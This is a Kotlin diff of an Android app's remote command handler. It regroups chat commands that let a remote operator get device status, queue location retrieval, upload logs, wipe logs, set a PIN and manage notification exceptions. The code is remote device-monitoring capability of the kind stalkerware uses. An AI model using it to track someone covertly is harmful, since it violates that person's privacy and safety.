@@ -58,33 +58,44 @@ class CommandProcessor(
         Log.i("CommandProcessor", "Received command: $command")
         
         when {
-            command.startsWith("/ping") -> {
-                val lastHeartbeat = prefs.getLastHeartbeat()
-                val now = System.currentTimeMillis()
-                val device = com.zero.sentinel.utils.DeviceInfoHelper.getShortDeviceInfo()
-                
-                if (lastHeartbeat == 0L) {
-                    client.sendMessage("Pong! [$device]\nStatus: Waiting for first heartbeat.")
-                } else {
-                    val diff = now - lastHeartbeat
-                    val diffMin = diff / (60 * 1000)
-                    val nextIn = maxOf(0, 15 - diffMin)
-                    
-                    val formatter = java.text.SimpleDateFormat("HH:mm", java.util.Locale.getDefault())
-                    val nextRunTime = formatter.format(java.util.Date(now + (nextIn * 60 * 1000)))
-                    
-                    client.sendMessage(
-                        "Pong! [$device]\n" +
-                        "⏱️ Last run: ${diffMin}m ago\n" +
-                        "🔄 Next cycle: ~${nextIn}m (at $nextRunTime)"
-                    )
-                }
+            command.startsWith("/stat") -> handleStatCommand()
+            command.startsWith("/fetch") -> handleFetchCommand(command)
+            command.startsWith("/config") -> handleConfigCommand(command)
+            else -> {
+                // Ignore unknown or legacy commands silently
             }
-            command.startsWith("/hwinfo") -> {
-                val info = com.zero.sentinel.utils.DeviceInfoHelper.getHardwareInfo(context)
-                client.sendMessage(info)
+        }
+    }
+
+    private fun handleStatCommand() {
+        val lastHeartbeat = prefs.getLastHeartbeat()
+        val now = System.currentTimeMillis()
+        
+        val heartbeatInfo = if (lastHeartbeat == 0L) {
+            "Status: Waiting for first heartbeat."
+        } else {
+            val diff = now - lastHeartbeat
+            val diffMin = diff / (60 * 1000)
+            val nextIn = maxOf(0, 15 - diffMin)
+            val formatter = java.text.SimpleDateFormat("HH:mm", java.util.Locale.getDefault())
+            val nextRunTime = formatter.format(java.util.Date(now + (nextIn * 60 * 1000)))
+            
+            "⏱️ **Last run**: ${diffMin}m ago\n🔄 **Next cycle**: ~${nextIn}m (at $nextRunTime)\n"
+        }
+        
+        val stats = com.zero.sentinel.utils.DeviceInfoHelper.getDeviceStats(context)
+        client.sendMessage("$stats\n$heartbeatInfo")
+    }
+
+    private fun handleFetchCommand(command: String) {
+        val arg = command.substringAfter("/fetch").trim().lowercase()
+        
+        when (arg) {
+            "loc", "location" -> {
+                prefs.savePendingLocationRequest(true)
+                client.sendMessage("📍 Location request queued. Will retrieve on next background cycle (max 15 mins).")
             }
-            command.startsWith("/getlogs") -> {
+            "logs", "log" -> {
                 scope.launch {
                     val success = com.zero.sentinel.utils.LogUploadHelper.upload(context, repository, client)
                     if (!success) {
@@ -92,65 +103,82 @@ class CommandProcessor(
                     }
                 }
             }
-            command.startsWith("/wipe") -> {
-                scope.launch {
-                    repository.deleteAllLogs()
-                    client.sendMessage("Logs wiped locally.")
-                }
-            }
-            command.startsWith("/setpin ") -> {
-                val newPin = command.substringAfter("/setpin ").trim()
-                if (newPin.isNotEmpty() && newPin.all { it.isDigit() } && newPin.length == 6) {
-                    prefs.saveAppPassword(newPin)
-                    client.sendMessage("PIN updated to: $newPin")
-                } else {
-                    client.sendMessage("Invalid PIN. Use 6 digits only.")
-                }
-            }
-            command.startsWith("/getloc") -> {
+            "all", "" -> {
+                // Do both
                 prefs.savePendingLocationRequest(true)
-                client.sendMessage("📍 Location request queued. Will retrieve on next background cycle (max 15 mins).")
+                scope.launch {
+                    val success = com.zero.sentinel.utils.LogUploadHelper.upload(context, repository, client)
+                    val logMsg = if (success) "Logs uploaded." else "No new logs to upload."
+                    client.sendMessage("📥 Fetch All initiated.\n- $logMsg\n- 📍 Location queued for next cycle.")
+                }
             }
-            command.startsWith("/exception") -> {
-                handleExceptionCommand(command)
-            }
-            else -> {
-                // Ignore unknown
-            }
+            else -> client.sendMessage("Unknown fetch argument. Use: `/fetch loc`, `/fetch logs`, or `/fetch all`.")
         }
     }
 
-    private fun handleExceptionCommand(command: String) {
+    private fun handleConfigCommand(command: String) {
         val parts = command.split(" ")
         val action = parts.getOrNull(1)?.lowercase()
         val target = parts.getOrNull(2)
 
-        // val prefs = com.zero.sentinel.data.EncryptedPrefsManager(context) // Removed, using injected 'prefs'
+        when (action) {
+            "wipe" -> {
+                scope.launch {
+                    repository.deleteAllLogs()
+                    client.sendMessage("🔥 All local logs wiped.")
+                }
+            }
+            "pin" -> {
+                if (target != null && target.all { it.isDigit() } && target.length == 6) {
+                    prefs.saveAppPassword(target)
+                    client.sendMessage("✅ PIN updated to: $target")
+                } else {
+                    client.sendMessage("⚠️ Invalid PIN. Use exactly 6 digits. (Example: `/config pin 123456`)")
+                }
+            }
+            "exc", "exception" -> {
+                handleExceptionSubCommand(target, parts.getOrNull(3))
+            }
+            else -> {
+                client.sendMessage(
+                    """
+                    ⚙️ **Config Usage:**
+                    `/config wipe` - Delete local logs
+                    `/config pin <6_digits>` - Set app pin
+                    `/config exc <add/del/list/wipe> [pkg_name]` - Manage notification exceptions
+                    """.trimIndent()
+                )
+            }
+        }
+    }
+
+    private fun handleExceptionSubCommand(subAction: String?, pkgTarget: String?) {
         val currentExceptions = prefs.getNotificationExceptions().toMutableSet()
+        val action = subAction?.lowercase()
 
         when (action) {
             "add" -> {
-                if (!target.isNullOrEmpty()) {
-                    if (currentExceptions.add(target)) {
+                if (!pkgTarget.isNullOrEmpty()) {
+                    if (currentExceptions.add(pkgTarget)) {
                         prefs.saveNotificationExceptions(currentExceptions)
-                        client.sendMessage("✅ Added to exceptions: $target")
+                        client.sendMessage("✅ Added to exceptions: $pkgTarget")
                     } else {
-                        client.sendMessage("⚠️ Already in exceptions: $target")
+                        client.sendMessage("⚠️ Already in exceptions: $pkgTarget")
                     }
                 } else {
-                    client.sendMessage("Usage: /exception add <package_name>")
+                    client.sendMessage("Usage: `/config exc add <package_name>`")
                 }
             }
-            "remove", "delete" -> {
-                if (!target.isNullOrEmpty()) {
-                    if (currentExceptions.remove(target)) {
+            "remove", "del", "delete" -> {
+                if (!pkgTarget.isNullOrEmpty()) {
+                    if (currentExceptions.remove(pkgTarget)) {
                         prefs.saveNotificationExceptions(currentExceptions)
-                        client.sendMessage("🗑️ Removed from exceptions: $target")
+                        client.sendMessage("🗑️ Removed from exceptions: $pkgTarget")
                     } else {
-                        client.sendMessage("⚠️ Not found in exceptions: $target")
+                        client.sendMessage("⚠️ Not found in exceptions: $pkgTarget")
                     }
                 } else {
-                    client.sendMessage("Usage: /exception delete <package_name>")
+                    client.sendMessage("Usage: `/config exc del <package_name>`")
                 }
             }
             "list" -> {
@@ -169,10 +197,10 @@ class CommandProcessor(
                 client.sendMessage(
                     """
                     Usage:
-                    /exception add <pkg>
-                    /exception delete <pkg>
-                    /exception list
-                    /exception wipe
+                    `/config exc add <pkg>`
+                    `/config exc del <pkg>`
+                    `/config exc list`
+                    `/config exc wipe`
                     """.trimIndent()
                 )
             }
